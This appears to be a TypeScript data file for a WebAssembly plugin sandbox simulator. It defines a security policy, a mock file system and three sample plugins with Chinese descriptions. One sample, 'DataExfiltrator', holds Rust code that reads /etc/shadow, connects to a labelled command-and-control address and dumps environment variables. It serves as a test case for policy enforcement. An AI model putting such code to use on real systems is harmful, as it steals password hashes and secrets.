import { WasmPlugin, PluginLanguage, ActionType, SecurityPolicy } from './types';

export const DEFAULT_POLICY: SecurityPolicy = {
  allowedReadPaths: ['/data/public/*', './config.json'],
  allowedWritePaths: ['/tmp/*', './logs/*.log'],
  allowedDomains: ['api.example.com', 'analytics.internal'],
  maxMemoryMB: 128,
  maxCpuTimeMs: 1000,
  allowEnvAccess: false,
};

// Initial state of the virtual file system
export const INITIAL_FILES: Record<string, string> = {
  './config.json': '{"env": "production", "retries": 3}',
  '/data/public/profile.jpg': '[BINARY IMAGE DATA]',
  '/var/log/app.log': '2023-10-27 INFO: Application started...',
  '/etc/shadow': '[SENSITIVE PASSWORD HASHES]',
  '/etc/hosts': '127.0.0.1 localhost',
};

export const SAMPLE_PLUGINS: WasmPlugin[] = [
  {
    id: 'p1',
    name: 'LogRotator',
    language: PluginLanguage.GO,
    description: '一个良性工具，读取日志文件，压缩它们并上传指标。',
    size: '2.4MB',
    code: `package main

import (
    "fmt"
    "io/ioutil"
    "net/http"
)

func main() {
    // 1. Read config
    data, _ := ioutil.ReadFile("./config.json")
    fmt.Println("Config loaded:", len(data))

    // 2. Read logs
    logs, _ := ioutil.ReadFile("/var/log/app.log")
    
    // 3. Write compressed
    ioutil.WriteFile("/tmp/app.log.gz", logs, 0644)

    // 4. Send metrics
    http.Post("https://analytics.internal/metrics", "application/json", nil)
}`,
    mockActions: [
      { type: ActionType.FILE_READ, target: './config.json', delayMs: 200 },
      { type: ActionType.FILE_READ, target: '/var/log/app.log', delayMs: 500 },
      { type: ActionType.RESOURCE_ALLOC, target: 'memory:64MB', delayMs: 800 },
      { type: ActionType.FILE_WRITE, target: '/tmp/app.log.gz', delayMs: 1200 },
      { type: ActionType.NETWORK_CONNECT, target: 'analytics.internal', delayMs: 1800 },
    ]
  },
  {
    id: 'p2',
    name: 'DataExfiltrator',
    language: PluginLanguage.RUST,
    description: '一个可疑的插件，试图读取敏感系统文件并将它们发送到未知 IP。',
    size: '1.8MB',
    code: `use std::fs;
use std::net::TcpStream;

fn main() {
    // Attempt to read sensitive file
    let shadow = fs::read_to_string("/etc/shadow").unwrap();
    
    // Connect to external C&C server
    let mut stream = TcpStream::connect("192.168.0.66:8080").unwrap();
    
    // Send environment variables
    for (key, value) in std::env::vars() {
        println!("{}: {}", key, value);
    }
}`,
    mockActions: [
      { type: ActionType.FILE_READ, target: '/etc/shadow', delayMs: 300 },
      { type: ActionType.SYS_ENV, target: 'ENV_VARS', delayMs: 600 },
      { type: ActionType.NETWORK_CONNECT, target: '192.168.0.66', delayMs: 1000 },
    ]
  },
  {
    id: 'p3',
    name: 'ImageProcessor',
    language: PluginLanguage.TYPESCRIPT,
    description: '繁重的计算任务。调整特定目录中的图像大小。',
    size: '800KB',
    code: `import { readFile, writeFile } from "fs";

export function process() {
  // Read source
  const img = readFile("/data/public/profile.jpg");
  
  // Heavy computation simulation
  let result = 0;
  for(let i=0; i<10000000; i++) {
    result += i;
  }
  
  // Write result
  writeFile("/data/public/profile_thumb.jpg", img);
}`,
    mockActions: [
      { type: ActionType.FILE_READ, target: '/data/public/profile.jpg', delayMs: 400 },
      { type: ActionType.RESOURCE_ALLOC, target: 'memory:256MB', delayMs: 1000 }, // Might exceed limit
      { type: ActionType.RESOURCE_ALLOC, target: 'cpu:2000ms', delayMs: 2000 }, // Might exceed limit
      { type: ActionType.FILE_WRITE, target: '/data/public/profile_thumb.jpg', delayMs: 2500 },
    ]
  }
];